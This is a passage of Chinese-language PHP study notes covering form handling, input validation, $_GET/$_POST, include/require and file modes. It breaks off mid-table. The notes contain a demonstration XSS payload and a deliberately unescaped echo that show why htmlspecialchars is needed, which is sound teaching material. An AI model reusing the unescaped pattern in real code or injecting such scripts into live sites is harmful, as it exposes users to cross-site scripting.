<h2 id="PHP表单"><a href="#PHP表单" class="headerlink" title="PHP表单"></a>PHP表单</h2><h3 id="PHP表单和用户输入"><a href="#PHP表单和用户输入" class="headerlink" title="PHP表单和用户输入"></a>PHP表单和用户输入</h3><p>PHP 中的 $_GET 和 $_POST 变量用于检索表单中的信息，比如用户输入</p>
<h4 id="PHP-表单处理"><a href="#PHP-表单处理" class="headerlink" title="PHP 表单处理"></a>PHP 表单处理</h4><p>当处理 HTML 表单时，PHP 能把来自 HTML 页面中的表单元素自动变成可供 PHP 脚本使用</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250124214612831.png"></p>
<h4 id="PHP-获取下拉菜单的数据"><a href="#PHP-获取下拉菜单的数据" class="headerlink" title="PHP 获取下拉菜单的数据"></a>PHP 获取下拉菜单的数据</h4><h5 id="PHP-下拉菜单单选"><a href="#PHP-下拉菜单单选" class="headerlink" title="PHP 下拉菜单单选"></a>PHP 下拉菜单单选</h5><p>以下实例我们设置了下拉菜单三个选项，表单使用 GET 方式获取数据，action 属性值为空表示提交到当前脚本，我们可以通过 select 的 name 属性获取下拉菜单的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$q = isset($_GET[&#x27;q&#x27;])? htmlspecialchars($_GET[&#x27;q&#x27;]) : &#x27;&#x27;;</span><br><span class="line">if($q) &#123;</span><br><span class="line">        if($q ==&#x27;RUNOOB&#x27;) &#123;</span><br><span class="line">                echo &#x27;菜鸟教程&lt;br&gt;http://www.runoob.com&#x27;;</span><br><span class="line">        &#125; else if($q ==&#x27;GOOGLE&#x27;) &#123;</span><br><span class="line">                echo &#x27;Google 搜索&lt;br&gt;http://www.google.com&#x27;;</span><br><span class="line">        &#125; else if($q ==&#x27;TAOBAO&#x27;) &#123;</span><br><span class="line">                echo &#x27;淘宝&lt;br&gt;http://www.taobao.com&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; </span><br><span class="line">    &lt;select name=&quot;q&quot;&gt;</span><br><span class="line">    &lt;option value=&quot;&quot;&gt;选择一个站点:&lt;/option&gt;</span><br><span class="line">    &lt;option value=&quot;RUNOOB&quot;&gt;Runoob&lt;/option&gt;</span><br><span class="line">    &lt;option value=&quot;GOOGLE&quot;&gt;Google&lt;/option&gt;</span><br><span class="line">    &lt;option value=&quot;TAOBAO&quot;&gt;Taobao&lt;/option&gt;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="htmlspecialchars-GET-q-是一种防止-跨站脚本攻击XSS-的安全措施"><a href="#htmlspecialchars-GET-q-是一种防止-跨站脚本攻击XSS-的安全措施" class="headerlink" title="htmlspecialchars($_GET[&#39;q&#39;]) 是一种防止 跨站脚本攻击XSS 的安全措施"></a><code>htmlspecialchars($_GET[&#39;q&#39;])</code> 是一种防止 <strong>跨站脚本攻击XSS</strong> 的安全措施</h4><p><code>htmlspecialchars()</code>函数会对用户输入的数据进行转义处理，<strong>将特殊的 HTML 字符转换为 HTML 实体</strong>，以防止它们被解释为 HTML 或 JavaScript 代码</p>
<p>将以下字符转换为 HTML 实体：</p>
<ul>
<li><p><code>&amp;</code> → <code>&amp;amp;</code></p>
</li>
<li><p><code>&lt;</code> → <code>&amp;lt;</code></p>
</li>
<li><p><code>&gt;</code> → <code>&amp;gt;</code></p>
</li>
<li><p><code>&quot;</code> → <code>&amp;quot;</code></p>
</li>
<li><p><code>&#39;</code> → <code>&amp;#039;</code>（仅在使用 <code>ENT_QUOTES</code> 时）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 假设 URL 为：http://example.com/?q=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">$q = $_GET[&#x27;q&#x27;];</span><br><span class="line">echo &quot;您输入的内容是：$q&quot;;</span><br><span class="line">//输出：您输入的内容是：&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 假设 URL 为：http://example.com/?q=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">$q = htmlspecialchars($_GET[&#x27;q&#x27;]);</span><br><span class="line">echo &quot;您输入的内容是：$q&quot;;</span><br><span class="line">//输出：您输入的内容是：&amp;lt;script&amp;gt;alert(&#x27;XSS&#x27;)&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</blockquote>
<blockquote>
<p>[!NOTE]</p>
<h4 id="php与html切换"><a href="#php与html切换" class="headerlink" title="php与html切换"></a>php与html切换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (条件) &#123;</span><br><span class="line">    // 执行一些 PHP 代码</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;!-- 这里是 HTML 代码 --&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="PHP-下拉菜单多选"><a href="#PHP-下拉菜单多选" class="headerlink" title="PHP 下拉菜单多选"></a>PHP 下拉菜单多选</h5><p>如果下拉菜单是多选的（ multiple&#x3D;”multiple”），我们可以通过将设置 select <strong>name&#x3D;”q[]”</strong> 以数组的方式获取，以下使用 POST 方式提交</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$q = isset($_POST[&#x27;q&#x27;])? $_POST[&#x27;q&#x27;] : &#x27;&#x27;;</span><br><span class="line">if(is_array($q)) &#123;</span><br><span class="line">    $sites = array(</span><br><span class="line">            &#x27;RUNOOB&#x27; =&gt; &#x27;菜鸟教程: http://www.runoob.com&#x27;,</span><br><span class="line">            &#x27;GOOGLE&#x27; =&gt; &#x27;Google 搜索: http://www.google.com&#x27;,</span><br><span class="line">            &#x27;TAOBAO&#x27; =&gt; &#x27;淘宝: http://www.taobao.com&#x27;,</span><br><span class="line">    );</span><br><span class="line">    foreach($q as $val) &#123;</span><br><span class="line">        // PHP_EOL 为常量，用于换行</span><br><span class="line">        echo $sites[$val] . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt; </span><br><span class="line">    &lt;select multiple=&quot;multiple&quot; name=&quot;q[]&quot;&gt;</span><br><span class="line">    &lt;option value=&quot;&quot;&gt;选择一个站点:&lt;/option&gt;</span><br><span class="line">    &lt;option value=&quot;RUNOOB&quot;&gt;Runoob&lt;/option&gt;</span><br><span class="line">    &lt;option value=&quot;GOOGLE&quot;&gt;Google&lt;/option&gt;</span><br><span class="line">    &lt;option value=&quot;TAOBAO&quot;&gt;Taobao&lt;/option&gt;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="单选按钮表单"><a href="#单选按钮表单" class="headerlink" title="单选按钮表单"></a>单选按钮表单</h4><p>PHP 单选按钮表单中 name 属性的值是一致的，value 值是不同的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$q = isset($_GET[&#x27;q&#x27;])? htmlspecialchars($_GET[&#x27;q&#x27;]) : &#x27;&#x27;;</span><br><span class="line">if($q) &#123;</span><br><span class="line">        if($q ==&#x27;RUNOOB&#x27;) &#123;</span><br><span class="line">                echo &#x27;菜鸟教程&lt;br&gt;http://www.runoob.com&#x27;;</span><br><span class="line">        &#125; else if($q ==&#x27;GOOGLE&#x27;) &#123;</span><br><span class="line">                echo &#x27;Google 搜索&lt;br&gt;http://www.google.com&#x27;;</span><br><span class="line">        &#125; else if($q ==&#x27;TAOBAO&#x27;) &#123;</span><br><span class="line">                echo &#x27;淘宝&lt;br&gt;http://www.taobao.com&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125; else &#123;?&gt;&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; </span><br><span class="line">    &lt;input type=&quot;radio&quot; name=&quot;q&quot; value=&quot;RUNOOB&quot; /&gt;Runoob</span><br><span class="line">    &lt;input type=&quot;radio&quot; name=&quot;q&quot; value=&quot;GOOGLE&quot; /&gt;Google</span><br><span class="line">    &lt;input type=&quot;radio&quot; name=&quot;q&quot; value=&quot;TAOBAO&quot; /&gt;Taobao</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="checkbox-复选框"><a href="#checkbox-复选框" class="headerlink" title="checkbox 复选框"></a>checkbox 复选框</h4><p>PHP checkbox 复选框可以选择多个值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$q = isset($_POST[&#x27;q&#x27;])? $_POST[&#x27;q&#x27;] : &#x27;&#x27;;</span><br><span class="line">if(is_array($q)) &#123;</span><br><span class="line">    $sites = array(</span><br><span class="line">            &#x27;RUNOOB&#x27; =&gt; &#x27;菜鸟教程: http://www.runoob.com&#x27;,</span><br><span class="line">            &#x27;GOOGLE&#x27; =&gt; &#x27;Google 搜索: http://www.google.com&#x27;,</span><br><span class="line">            &#x27;TAOBAO&#x27; =&gt; &#x27;淘宝: http://www.taobao.com&#x27;,</span><br><span class="line">    );</span><br><span class="line">    foreach($q as $val) &#123;</span><br><span class="line">        // PHP_EOL 为常量，用于换行</span><br><span class="line">        echo $sites[$val] . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">&#125; else &#123;?&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt; </span><br><span class="line">    &lt;input type=&quot;checkbox&quot; name=&quot;q[]&quot; value=&quot;RUNOOB&quot;&gt; Runoob&lt;br&gt; </span><br><span class="line">    &lt;input type=&quot;checkbox&quot; name=&quot;q[]&quot; value=&quot;GOOGLE&quot;&gt; Google&lt;br&gt; </span><br><span class="line">    &lt;input type=&quot;checkbox&quot; name=&quot;q[]&quot; value=&quot;TAOBAO&quot;&gt; Taobao&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="PHP-表单验证"><a href="#PHP-表单验证" class="headerlink" title="PHP 表单验证"></a>PHP 表单验证</h3><h4 id="SERVER-“PHP-SELF”-变量"><a href="#SERVER-“PHP-SELF”-变量" class="headerlink" title="$_SERVER[“PHP_SELF”] 变量"></a>$_SERVER[“PHP_SELF”] 变量</h4><p>是一个超全局变量，用于返回当前执行脚本的文件路径（相对于网站根目录）</p>
<p>通常用于：<strong>表单的自提交（self-submitting form）</strong>和<strong>动态生成页面链接</strong>。</p>
<h5 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a><strong>基本使用</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_SERVER[&quot;PHP_SELF&quot;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>假设访问路径：URL: <code>http://www.example.com/test/form.php</code></p>
<p>输出结果（<code>$_SERVER[&quot;PHP_SELF&quot;]</code> 的值为）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/test/form.php</span><br></pre></td></tr></table></figure>

<h5 id="表单自提交"><a href="#表单自提交" class="headerlink" title="表单自提交"></a>表单自提交</h5><p>通过 <code>$_SERVER[&quot;PHP_SELF&quot;]</code> 实现表单提交到当前页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;</span><br><span class="line">    $name = htmlspecialchars($_POST[&#x27;name&#x27;]);</span><br><span class="line">    echo &quot;你好, $name!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo htmlspecialchars($_SERVER[&quot;PHP_SELF&quot;]); ?&gt;&quot;&gt;</span><br><span class="line">    姓名: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p><code>htmlspecialchars($_SERVER[&quot;PHP_SELF&quot;])</code>避免XSS</p>
<h4 id="使用-PHP-验证表单数据"><a href="#使用-PHP-验证表单数据" class="headerlink" title="使用 PHP 验证表单数据"></a>使用 PHP 验证表单数据</h4><p>首先我们对用户所有提交的数据都通过 PHP 的 htmlspecialchars() 函数处理。</p>
<p>当我们使用 htmlspecialchars() 函数时，在用户尝试提交以下文本域:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;location.href(&#x27;http://www.runoob.com&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>该代码将不会被执行，因为它会被保存为HTML转义代码，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;lt;script&amp;gt;location.href(&#x27;http://www.runoob.com&#x27;)&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure>

<p>以上代码是安全的，可以正常在页面显示或者插入邮件中。</p>
<p>当用户提交表单时，我们将做以下两件事情：</p>
<ol>
<li>使用 PHP <strong>trim() 函数</strong>去除用户输入数据中不必要的字符 (如：空格，tab，换行)。</li>
<li>使用PHP <strong>stripslashes()函数</strong>去除用户输入数据中的反斜杠 (<code>\</code>)</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 定义变量并默认设置为空值</span><br><span class="line">$name = $email = $gender = $comment = $website = &quot;&quot;;</span><br><span class="line"> </span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  $name = test_input($_POST[&quot;name&quot;]);</span><br><span class="line">  $email = test_input($_POST[&quot;email&quot;]);</span><br><span class="line">  $website = test_input($_POST[&quot;website&quot;]);</span><br><span class="line">  $comment = test_input($_POST[&quot;comment&quot;]);</span><br><span class="line">  $gender = test_input($_POST[&quot;gender&quot;]);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function test_input($data)</span><br><span class="line">&#123;</span><br><span class="line">  $data = trim($data);</span><br><span class="line">  $data = stripslashes($data);</span><br><span class="line">  $data = htmlspecialchars($data);</span><br><span class="line">  return $data;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="PHP-表单-必需字段"><a href="#PHP-表单-必需字段" class="headerlink" title="PHP 表单 - 必需字段"></a>PHP 表单 - 必需字段</h3><h4 id="PHP-必需字段"><a href="#PHP-必需字段" class="headerlink" title="PHP - 必需字段"></a>PHP - 必需字段</h4><table>
<thead>
<tr>
<th align="left">字段</th>
<th align="left">验证规则</th>
</tr>
</thead>
<tbody><tr>
<td align="left">名字</td>
<td align="left">必需。 + 只能包含字母和空格</td>
</tr>
<tr>
<td align="left">E-mail</td>
<td align="left">必需。 + 必需包含一个有效的电子邮件地址（包含”@”和”.”）</td>
</tr>
<tr>
<td align="left">网址</td>
<td align="left">可选。 如果存在，它必需包含一个有效的URL</td>
</tr>
<tr>
<td align="left">备注</td>
<td align="left">可选。多行字段（文本域）。</td>
</tr>
<tr>
<td align="left">性别</td>
<td align="left">必需。必需选择一个。</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 定义变量并默认设为空值</span><br><span class="line">$nameErr= &quot;&quot;;</span><br><span class="line">$name= &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;</span><br><span class="line">  if (empty($_POST[&quot;name&quot;])) &#123;</span><br><span class="line">    $nameErr = &quot;名字是必需的。&quot;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $name = test_input($_POST[&quot;name&quot;]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="PHP-显示错误信息"><a href="#PHP-显示错误信息" class="headerlink" title="PHP - 显示错误信息"></a>PHP - 显示错误信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo htmlspecialchars($_SERVER[&#x27;PHP_SELF&#x27;]);?&gt;&quot;&gt; </span><br><span class="line">   名字: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span><br><span class="line">   &lt;span class=&quot;error&quot;&gt;* &lt;?php echo $nameErr;?&gt;&lt;/span&gt;</span><br><span class="line">   &lt;br&gt;&lt;br&gt;</span><br><span class="line">   &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;&gt; </span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!IMPORTANT]</p>
<p><code>&lt;span class=&quot;error&quot;&gt;* &lt;?php echo $nameErr;?&gt;&lt;/span&gt;</code> 是用来在 HTML 页面中动态显示表单验证的错误提示消息的</p>
<p>如果 <code>$nameErr</code> 为空，则此部分不会显示内容。</p>
<p>如果 <code>$nameErr</code> 包含错误消息，会在页面中显示，例如：<code>名字是必填项</code></p>
</blockquote>
<h3 id="PHP-表单-验证邮件和URL"><a href="#PHP-表单-验证邮件和URL" class="headerlink" title="PHP 表单 - 验证邮件和URL"></a>PHP 表单 - 验证邮件和URL</h3><h4 id="PHP-验证名称"><a href="#PHP-验证名称" class="headerlink" title="PHP - 验证名称"></a>PHP - 验证名称</h4><p>以下代码将通过简单的方式来检测 name 字段是否包含字母和空格，如果 name 字段值不合法，将输出错误信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$name = test_input($_POST[&quot;name&quot;]);</span><br><span class="line">if (!preg_match(&quot;/^[a-zA-Z ]*$/&quot;,$name)) &#123;</span><br><span class="line">  $nameErr = &quot;只允许字母和空格&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h4><p>进行正则表达式匹配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int preg_match ( string $pattern , string $subject [, array $matches [, int $flags ]] )</span><br></pre></td></tr></table></figure>

<h5 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h5><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250125083915517.png"></p>
<p>preg_replace()可用于删除所有 HTML 标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$html = &quot;&lt;h1&gt;Title&lt;/h1&gt;&lt;p&gt;Content&lt;/p&gt;&quot;;</span><br><span class="line">$plainText = preg_replace(&quot;/&lt;[^&gt;]+&gt;/&quot;, &quot;&quot;, $html); // 替换所有 HTML 标签</span><br><span class="line">echo $plainText; // 输出 &quot;TitleContent&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id=""><a href="#" class="headerlink" title=""></a></h5></blockquote>
<h4 id="PHP-验证邮件"><a href="#PHP-验证邮件" class="headerlink" title="PHP - 验证邮件"></a>PHP - 验证邮件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$email = test_input($_POST[&quot;email&quot;]);</span><br><span class="line">if (!preg_match(&quot;/([\w\-]+\@[\w\-]+\.[\w\-]+)/&quot;,$email)) &#123;</span><br><span class="line">  $emailErr = &quot;非法邮箱格式&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>\w匹配任意字母、数字或下划线（[a-zA-Z0-9_]）</code></p>
<h4 id="PHP-验证-URL"><a href="#PHP-验证-URL" class="headerlink" title="PHP - 验证 URL"></a>PHP - 验证 URL</h4><p>以下代码将检测URL地址是否合法 (以下正则表达式运行URL中含有破折号:”-“)， 如果 URL 地址不合法，将输出错误信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$website = test_input($_POST[&quot;website&quot;]);</span><br><span class="line">if (!preg_match(&quot;/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%=~_|]/i&quot;,$website)) &#123;</span><br><span class="line">  $websiteErr = &quot;非法的 URL 的地址&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PHP-GET和-POST变量"><a href="#PHP-GET和-POST变量" class="headerlink" title="PHP $GET和$POST变量"></a>PHP $GET和$POST变量</h3><h4 id="GET-变量"><a href="#GET-变量" class="headerlink" title="$_GET 变量"></a>$_GET 变量</h4><p>预定义的 $_GET 变量用于收集来自 method&#x3D;”get” 的表单中的值</p>
<p>从带有 GET 方法的表单发送的信息，对任何人都是<strong>可见</strong>的（会显示在浏览器的地址栏），并且对发送信息的量也有限制</p>
<p>在 HTML 表单中使用 method&#x3D;”get” 时，所有的变量名和值都会显示在 URL 中，，因此可以在收藏夹中收藏该页面，但在发送密码或其他敏感信息时，不应该使用这个方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.runoob.com/welcome.php?fname=Runoob&amp;age=3</span><br></pre></td></tr></table></figure>

<h4 id="POST-变量"><a href="#POST-变量" class="headerlink" title="$_POST 变量"></a>$_POST 变量</h4><p>预定义的 $_POST 变量用于收集来自 method&#x3D;”post” 的表单中的值</p>
<p>从带有 POST 方法的表单发送的信息，对任何人都是<strong>不可见</strong>的（不会显示在浏览器的地址栏），并且对<strong>发送信息的量也没有限制</strong></p>
<p>注释：然而，默认情况下，POST 方法的发送信息的量最大值为 8 MB（可通过设置 php.ini 文件中的 post_max_size 进行更改）</p>
<p>变量不显示在 URL 中，所以无法把页面加入书签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.runoob.com/welcome.php</span><br></pre></td></tr></table></figure>

<h4 id="REQUEST-变量"><a href="#REQUEST-变量" class="headerlink" title="$_REQUEST 变量"></a>$_REQUEST 变量</h4><p>预定义的 $_REQUEST 变量包含了 $_GET、$_POST 和 $_COOKIE 的内容。</p>
<p>$_REQUEST 变量可用来收集通过 GET 和 POST 方法发送的表单数据</p>
<h2 id="PHP-高级教程"><a href="#PHP-高级教程" class="headerlink" title="PHP 高级教程"></a>PHP 高级教程</h2><h3 id="PHP-包含文件"><a href="#PHP-包含文件" class="headerlink" title="PHP 包含文件"></a>PHP 包含文件</h3><p>用于将一个文件的内容插入到另一个文件中</p>
<h4 id="PHP-include-和-require-语句"><a href="#PHP-include-和-require-语句" class="headerlink" title="PHP include 和 require 语句"></a>PHP include 和 require 语句</h4><p>include 和 require 语句用于在执行流中插入写在其他文件中的有用的代码</p>
<p><strong>include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：</strong></p>
<p>require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。</p>
<p>include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。</p>
<p>因此，如果您希望继续执行，并向用户输出结果，即使包含文件已丢失，那么请使用 include。否则，在框架、CMS 或者复杂的 PHP 应用程序编程中，请始终使用 require 向执行流引用关键文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include &#x27;filename&#x27;;</span><br><span class="line">或者</span><br><span class="line">require &#x27;filename&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><h5 id="1"><a href="#1" class="headerlink" title="1"></a>1</h5><p>假设有一个标准的页头文件，名为 “header.php”。如需在页面中引用这个页头文件，请使用 include&#x2F;require</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php include &#x27;header.php&#x27;; ?&gt;</span><br><span class="line">&lt;h1&gt;欢迎来到我的主页!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;一些文本。&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h5 id="2"><a href="#2" class="headerlink" title="2"></a>2</h5><p>假设我们有一个在所有页面中使用的标准菜单文件。</p>
<p>“menu.php”:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;a href=&quot;/&quot;&gt;主页&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;/html&quot;&gt;HTML 教程&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;/php&quot;&gt;PHP 教程&lt;/a&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p>网站中的所有页面均应引用该菜单文件。以下是具体的做法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;leftmenu&quot;&gt;</span><br><span class="line">&lt;?php include &#x27;menu.php&#x27;; ?&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;h1&gt;欢迎来到我的主页!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;一些文本。&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h5 id="3"><a href="#3" class="headerlink" title="3"></a>3</h5><p>假设我们有一个定义变量的包含文件（”vars.php”）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$color=&#x27;red&#x27;;</span><br><span class="line">$car=&#x27;BMW&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这些变量可用在调用文件中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;欢迎来到我的主页!&lt;/h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">include &#x27;vars.php&#x27;;</span><br><span class="line">echo &quot;I have a $color $car&quot;; // I have a red BMW</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="PHP-文件处理"><a href="#PHP-文件处理" class="headerlink" title="PHP 文件处理"></a>PHP 文件处理</h3><h4 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h4><p>fopen() 函数用于在 PHP 中打开文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=fopen(&quot;welcome.txt&quot;,&quot;r&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>此函数的第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件</p>
<table>
<thead>
<tr>
<th align="left">模式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">r</td>
<td align="left">只读。在文件的开头开始。</td>
</tr>
<tr>
<td align="left">r+</td>
<td align="left">读&#x2F;写。在文件的开头开始。</td>
</tr>
<tr>
<td align="left">w</td>
<td align="left">只写。打开并清空文件的内容；如果文件不存在，则创建新文件。</td>
</tr>
<tr>
<td align="left">w+</td>
<td align="left">读&#x2F;写。打开并清空文件的内容；如果文件不存在，则创建新文件。</td>
</tr>
<tr>
<td align="left">a</td>
<td align="left">追加。打开并向文件末尾进行写操作，如果文件不存在，则创建新文件。</td>
</tr>
<tr>
<td align="left">a+</td>
<td align="left">读&#x2F;追加。通过向文件末尾写内容，来保持文件内容。</td>
</tr>
<tr>
<td align="left">x</td>
<td align="left">只写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。</td>
</tr>
<tr>
